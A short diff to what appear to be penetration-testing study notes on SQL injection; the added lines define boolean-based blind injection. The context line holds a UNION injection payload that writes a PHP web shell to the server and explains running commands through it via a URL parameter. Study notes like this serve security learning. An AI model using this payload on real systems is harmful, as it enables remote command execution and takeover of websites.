@@ -360,3 +360,11 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 ```
 
 This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL.
+
+
+# Boolean based SQL injection
+There are two types of blind SQL injections: boolean-based and time-based.
+
+Boolean-based blind SQL injection is a subtype of blind SQL injection where the attacker observes the behavior of the database server and the application after combining legitimate queries with malicious data using boolean operators.
+
+
